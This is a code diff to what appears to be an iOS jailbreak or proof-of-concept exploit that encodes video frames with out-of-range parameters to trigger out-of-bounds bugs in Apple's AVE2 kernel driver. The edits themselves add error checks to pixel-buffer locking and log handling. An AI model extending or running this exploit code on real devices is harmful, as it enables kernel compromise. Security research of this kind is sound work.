@@ -221,6 +221,13 @@ static void pocLog(NSString *msg) {
             [[NSFileManager defaultManager] createDirectoryAtPath:docs
                 withIntermediateDirectories:YES attributes:nil error:nil];
             g_liveLog = fopen([docs stringByAppendingPathComponent:@"console_live.txt"].fileSystemRepresentation, "a");
+            if (!g_liveLog) {
+                static BOOL r6openFail = NO;
+                if (!r6openFail) {
+                    NSLog(@"[-] console_live.txt fopen failed — live logging disabled");
+                    r6openFail = YES;
+                }
+            }
         }
         if (g_liveLog) {
             /* r5 F2: fflush to OS + fsync for durability; checked. */
@@ -317,6 +324,15 @@ static void jbRunLog(NSString *line) {
 static void jbSyncFile(NSString *path) {
     int fd = open(path.fileSystemRepresentation, O_RDONLY);
     if (fd >= 0) { fsync(fd); close(fd); }
+}
+
+static BOOL jbLockPB(CVPixelBufferRef pb, CVOptionFlags flags) {
+    CVReturn r = CVPixelBufferLockBaseAddress(pb, flags);
+    if (r != kCVReturnSuccess) {
+        NSLog(@"CVPixelBufferLockBaseAddress failed: %d", (int)r);
+        return NO;
+    }
+    return YES;
 }
 
 static NSString *jbJournalPath(void) {
@@ -466,28 +482,33 @@ static void jbPersistLog(void) {
             withIntermediateDirectories:YES attributes:nil error:nil];
         NSDateFormatter *f = [[NSDateFormatter alloc] init];
         f.dateFormat = @"yyyyMMdd_HHmmss";
-        NSString *fn = [NSString stringWithFormat:@"%@/console_%@.txt",
-                        docs, [f stringFromDate:[NSDate date]]];
+        NSTimeInterval now = [[NSDate date] timeIntervalSince1970];
+        int millis = (int)((now - floor(now)) * 1000);
+        NSString *fn = [NSString stringWithFormat:@"%@/console_%@_%03d.txt",
+                        docs, [f stringFromDate:[NSDate date]], millis];
         NSFileManager *fm = [NSFileManager defaultManager];
         NSString *live = [docs stringByAppendingPathComponent:@"console_live.txt"];
-        BOOL ok = NO;
+        BOOL saved = NO;
         if ([fm fileExistsAtPath:live]) {
-            jbSyncFile(live); // flush the live mirror before copying
+            jbSyncFile(live);
             NSError *cerr = nil;
-            ok = [fm copyItemAtPath:live toPath:fn error:&cerr];
-            if (!ok) NSLog(@"jbPersistLog: live-history copy failed: %@", cerr.localizedDescription);
+            saved = [fm copyItemAtPath:live toPath:fn error:&cerr];
+            if (!saved) NSLog(@"jbPersistLog: live-history copy failed: %@", cerr.localizedDescription);
         }
-        if (!ok) {
+        if (!saved) {
             if ([g_logBuffer length] == 0) return;
             NSError *werr = nil;
-            if (![g_logBuffer writeToFile:fn atomically:YES
-                                  encoding:NSUTF8StringEncoding error:&werr])
-                NSLog(@"jbPersistLog: fallback write failed: %@", werr.localizedDescription);
+            saved = [g_logBuffer writeToFile:fn atomically:YES
+                                    encoding:NSUTF8StringEncoding error:&werr];
+            if (!saved) NSLog(@"jbPersistLog: fallback write failed: %@", werr.localizedDescription);
         }
-        // fresh live mirror for the next run (checked)
+        if (!saved) {
+            NSLog(@"jbPersistLog: both saves failed — live log preserved");
+            return;
+        }
         if (g_liveLog) {
             fflush(g_liveLog); fsync(fileno(g_liveLog));
-            fclose(g_liveLog); g_liveLog = NULL; /* r5 F1: rotate before truncate */
+            fclose(g_liveLog); g_liveLog = NULL;
         }
         FILE *r5tf = fopen(live.fileSystemRepresentation, "w");
         if (r5tf) fclose(r5tf);
@@ -1084,14 +1105,15 @@ static void testAVE2_VideoToolbox(void) {
         return;
     }
 
-    CVPixelBufferLockBaseAddress(pb, 0);
-    void *y = CVPixelBufferGetBaseAddressOfPlane(pb, 0);
-    if (y) memset(y, 0x80,
-        CVPixelBufferGetBytesPerRowOfPlane(pb, 0) * CVPixelBufferGetHeightOfPlane(pb, 0));
-    void *uv = CVPixelBufferGetBaseAddressOfPlane(pb, 1);
-    if (uv) memset(uv, 0x80,
-        CVPixelBufferGetBytesPerRowOfPlane(pb, 1) * CVPixelBufferGetHeightOfPlane(pb, 1));
-    CVPixelBufferUnlockBaseAddress(pb, 0);
+    if (jbLockPB(pb, 0)) {
+        void *y = CVPixelBufferGetBaseAddressOfPlane(pb, 0);
+        if (y) memset(y, 0x80,
+            CVPixelBufferGetBytesPerRowOfPlane(pb, 0) * CVPixelBufferGetHeightOfPlane(pb, 0));
+        void *uv = CVPixelBufferGetBaseAddressOfPlane(pb, 1);
+        if (uv) memset(uv, 0x80,
+            CVPixelBufferGetBytesPerRowOfPlane(pb, 1) * CVPixelBufferGetHeightOfPlane(pb, 1));
+        CVPixelBufferUnlockBaseAddress(pb, 0);
+    }
 
     INFO(@"Encoding frame (sends params to AppleAVE2 kernel driver)...");
 
@@ -1540,16 +1562,17 @@ static void runTier1OOB(void) {
         return;
     }
 
-    CVPixelBufferLockBaseAddress(pb, 0);
-    void *y = CVPixelBufferGetBaseAddressOfPlane(pb, 0);
-    if (y) memset(y, 0x80,
-        CVPixelBufferGetBytesPerRowOfPlane(pb, 0) *
-        CVPixelBufferGetHeightOfPlane(pb, 0));
-    void *uv = CVPixelBufferGetBaseAddressOfPlane(pb, 1);
-    if (uv) memset(uv, 0x80,
-        CVPixelBufferGetBytesPerRowOfPlane(pb, 1) *
-        CVPixelBufferGetHeightOfPlane(pb, 1));
-    CVPixelBufferUnlockBaseAddress(pb, 0);
+    if (jbLockPB(pb, 0)) {
+        void *y = CVPixelBufferGetBaseAddressOfPlane(pb, 0);
+        if (y) memset(y, 0x80,
+            CVPixelBufferGetBytesPerRowOfPlane(pb, 0) *
+            CVPixelBufferGetHeightOfPlane(pb, 0));
+        void *uv = CVPixelBufferGetBaseAddressOfPlane(pb, 1);
+        if (uv) memset(uv, 0x80,
+            CVPixelBufferGetBytesPerRowOfPlane(pb, 1) *
+            CVPixelBufferGetHeightOfPlane(pb, 1));
+        CVPixelBufferUnlockBaseAddress(pb, 0);
+    }
 
     pocLog(@"");
     LOG(@"*** ENCODING FRAME WITH TEMPORAL_LAYERS=8 ***");
@@ -1564,12 +1587,13 @@ static void runTier1OOB(void) {
     INFO(@"CompleteFrames: %d", (int)status);
 
     for (int i = 1; i <= 3; i++) {
-        CVPixelBufferLockBaseAddress(pb, 0);
-        y = CVPixelBufferGetBaseAddressOfPlane(pb, 0);
-        if (y) memset(y, 0x40 + i * 0x20,
-            CVPixelBufferGetBytesPerRowOfPlane(pb, 0) *
-            CVPixelBufferGetHeightOfPlane(pb, 0));
-        CVPixelBufferUnlockBaseAddress(pb, 0);
+        if (jbLockPB(pb, 0)) {
+            y = CVPixelBufferGetBaseAddressOfPlane(pb, 0);
+            if (y) memset(y, 0x40 + i * 0x20,
+                CVPixelBufferGetBytesPerRowOfPlane(pb, 0) *
+                CVPixelBufferGetHeightOfPlane(pb, 0));
+            CVPixelBufferUnlockBaseAddress(pb, 0);
+        }
 
         status = VTCompressionSessionEncodeFrame(session, pb,
             CMTimeMake(i, 30), kCMTimeInvalid, NULL, NULL, NULL);
@@ -1941,16 +1965,17 @@ static void runVerifyAndTrigger(void) {
         }, &pb);
     if (!pb) { FAIL(@"Pixel buffer failed"); return; }
 
-    CVPixelBufferLockBaseAddress(pb, 0);
-    void *y = CVPixelBufferGetBaseAddressOfPlane(pb, 0);
-    if (y) memset(y, 0x80,
-        CVPixelBufferGetBytesPerRowOfPlane(pb, 0) *
-        CVPixelBufferGetHeightOfPlane(pb, 0));
-    void *uv = CVPixelBufferGetBaseAddressOfPlane(pb, 1);
-    if (uv) memset(uv, 0x80,
-        CVPixelBufferGetBytesPerRowOfPlane(pb, 1) *
-        CVPixelBufferGetHeightOfPlane(pb, 1));
-    CVPixelBufferUnlockBaseAddress(pb, 0);
+    if (jbLockPB(pb, 0)) {
+        void *y = CVPixelBufferGetBaseAddressOfPlane(pb, 0);
+        if (y) memset(y, 0x80,
+            CVPixelBufferGetBytesPerRowOfPlane(pb, 0) *
+            CVPixelBufferGetHeightOfPlane(pb, 0));
+        void *uv = CVPixelBufferGetBaseAddressOfPlane(pb, 1);
+        if (uv) memset(uv, 0x80,
+            CVPixelBufferGetBytesPerRowOfPlane(pb, 1) *
+            CVPixelBufferGetHeightOfPlane(pb, 1));
+        CVPixelBufferUnlockBaseAddress(pb, 0);
+    }
 
     VTCompressionSessionEncodeFrame(session, pb,
         CMTimeMake(0, 30), kCMTimeInvalid, NULL, NULL, NULL);
@@ -5319,16 +5344,17 @@ static CVPixelBufferRef exp3CreatePixelBuffer(uint8_t yFill, uint8_t uvFill) {
         }, &pb);
     if (status != noErr || !pb) return NULL;
 
-    CVPixelBufferLockBaseAddress(pb, 0);
-    void *y = CVPixelBufferGetBaseAddressOfPlane(pb, 0);
-    if (y) memset(y, yFill,
-        CVPixelBufferGetBytesPerRowOfPlane(pb, 0) *
-        CVPixelBufferGetHeightOfPlane(pb, 0));
-    void *uv = CVPixelBufferGetBaseAddressOfPlane(pb, 1);
-    if (uv) memset(uv, uvFill,
-        CVPixelBufferGetBytesPerRowOfPlane(pb, 1) *
-        CVPixelBufferGetHeightOfPlane(pb, 1));
-    CVPixelBufferUnlockBaseAddress(pb, 0);
+    if (jbLockPB(pb, 0)) {
+        void *y = CVPixelBufferGetBaseAddressOfPlane(pb, 0);
+        if (y) memset(y, yFill,
+            CVPixelBufferGetBytesPerRowOfPlane(pb, 0) *
+            CVPixelBufferGetHeightOfPlane(pb, 0));
+        void *uv = CVPixelBufferGetBaseAddressOfPlane(pb, 1);
+        if (uv) memset(uv, uvFill,
+            CVPixelBufferGetBytesPerRowOfPlane(pb, 1) *
+            CVPixelBufferGetHeightOfPlane(pb, 1));
+        CVPixelBufferUnlockBaseAddress(pb, 0);
+    }
     return pb;
 }
 
@@ -6731,16 +6757,17 @@ static void runTier1bOOB(void) {
         return;
     }
 
-    CVPixelBufferLockBaseAddress(pb, 0);
-    void *y = CVPixelBufferGetBaseAddressOfPlane(pb, 0);
-    if (y) memset(y, 0x80,
-        CVPixelBufferGetBytesPerRowOfPlane(pb, 0) *
-        CVPixelBufferGetHeightOfPlane(pb, 0));
-    void *uv = CVPixelBufferGetBaseAddressOfPlane(pb, 1);
-    if (uv) memset(uv, 0x80,
-        CVPixelBufferGetBytesPerRowOfPlane(pb, 1) *
-        CVPixelBufferGetHeightOfPlane(pb, 1));
-    CVPixelBufferUnlockBaseAddress(pb, 0);
+    if (jbLockPB(pb, 0)) {
+        void *y = CVPixelBufferGetBaseAddressOfPlane(pb, 0);
+        if (y) memset(y, 0x80,
+            CVPixelBufferGetBytesPerRowOfPlane(pb, 0) *
+            CVPixelBufferGetHeightOfPlane(pb, 0));
+        void *uv = CVPixelBufferGetBaseAddressOfPlane(pb, 1);
+        if (uv) memset(uv, 0x80,
+            CVPixelBufferGetBytesPerRowOfPlane(pb, 1) *
+            CVPixelBufferGetHeightOfPlane(pb, 1));
+        CVPixelBufferUnlockBaseAddress(pb, 0);
+    }
 
     pocLog(@"");
     LOG(@"*** ENCODING WITH AlphaLayerID=64 ***");
@@ -6817,16 +6844,17 @@ static void runTier1bOOB(void) {
         return;
     }
 
-    CVPixelBufferLockBaseAddress(pb, 0);
-    y = CVPixelBufferGetBaseAddressOfPlane(pb, 0);
-    if (y) memset(y, 0x80,
-        CVPixelBufferGetBytesPerRowOfPlane(pb, 0) *
-        CVPixelBufferGetHeightOfPlane(pb, 0));
-    uv = CVPixelBufferGetBaseAddressOfPlane(pb, 1);
-    if (uv) memset(uv, 0x80,
-        CVPixelBufferGetBytesPerRowOfPlane(pb, 1) *
-        CVPixelBufferGetHeightOfPlane(pb, 1));
-    CVPixelBufferUnlockBaseAddress(pb, 0);
+    if (jbLockPB(pb, 0)) {
+        y = CVPixelBufferGetBaseAddressOfPlane(pb, 0);
+        if (y) memset(y, 0x80,
+            CVPixelBufferGetBytesPerRowOfPlane(pb, 0) *
+            CVPixelBufferGetHeightOfPlane(pb, 0));
+        uv = CVPixelBufferGetBaseAddressOfPlane(pb, 1);
+        if (uv) memset(uv, 0x80,
+            CVPixelBufferGetBytesPerRowOfPlane(pb, 1) *
+            CVPixelBufferGetHeightOfPlane(pb, 1));
+        CVPixelBufferUnlockBaseAddress(pb, 0);
+    }
 
     pocLog(@"");
     LOG(@"*** ENCODING WITH RepFormatIndex=10 ***");
